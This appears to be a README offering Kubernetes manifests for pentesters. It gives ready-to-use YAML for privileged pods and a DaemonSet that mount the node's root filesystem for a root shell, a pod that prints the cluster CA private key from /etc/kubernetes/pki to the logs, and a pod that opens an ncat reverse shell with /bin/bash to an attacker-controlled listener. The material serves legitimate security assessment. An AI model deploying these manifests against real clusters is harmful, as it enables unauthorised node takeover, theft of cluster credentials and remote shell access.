# Attacker Manifests

These are Kubernetes manifests that could be useful on security assessments, or pentests. 

N.B. for pentesters, make sure you have delete rights to the objects you create and make sure to clean up when you're done!

## General form

* `kubectl create -f [MANIFEST.YAML]` creates object contained in a file called [MANIFEST.YAML]
* `kubectl delete -f [MANIFEST.YAML]` deletes object contained in a file called [MANIFEST.YAML]

if you want to create the objects in a specific namespace that isn't your current active one add the following to your manifest under metadata

```yaml
  namespace: [NAMESPACENAME]
```

## Root Pod

This manifest will create a privileged pod on a node in the cluster. Once it's running `kubectl exec -it noderootpod chroot /host` should give you a root shell on the node.

This won't work if :-

1. You don't have right to create pods in the namespace. You'll also need rights to pod/exec in order to get the shell in the pod afterwards.
2. The node can't pull images from Docker Hub
3. There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

## Root daemonset

This manifest does the same thing as the pod one, except it creates a pod on every cluster node (including control plane nodes in un-managed clusters). Once it's running, get a list of pods in the daemonset with `kubectl get daemonset noderootdaemon` then use kubectl exec (as above) to execute the `chroot /host` command in one of the pods

This won't work if :-

1. You don't have right to create daemonsets in the namespace. You'll also need rights to pod/exec to get the shell afterwards.
2. The node can't pull images from Docker Hub
3. There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods by the replicaset controller in that namespace.


```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootdaemon
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
```

## Sensitive file logger

In a scenario where you have create pods and access to pod logs (a right commonly given for diagnostics) but don't have pod/exec, it can still be possible to use your rights to escalate access to a cluster, by creating a pod which cat's a file to STDOUT (as this will be logged in the container logs)

The manifest below is an example of this. It would work on a kubeadm cluster, when deployed to a master node. To adapt to other scenarios, just change the volume mount and file in the `command` parameter

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: keydumper-pod
  labels:
    app: keydumper
spec:
  containers:
  - name: keydumper-pod
    image: busybox
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    command: ['cat', '/pki/ca.key']
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory
```

## Reverse Shell

For setups where you only have create pod, but don't have access to pod/exec or pod logs, it's often possible to setup a reverse shell. First setup an ncat listener with something like

```bash
ncat -l -p 8989
```

Then use the manifest below. Replace `[IP]` with the IP address of the host with the ncat listener.  

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['[IP]', '8989', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
```
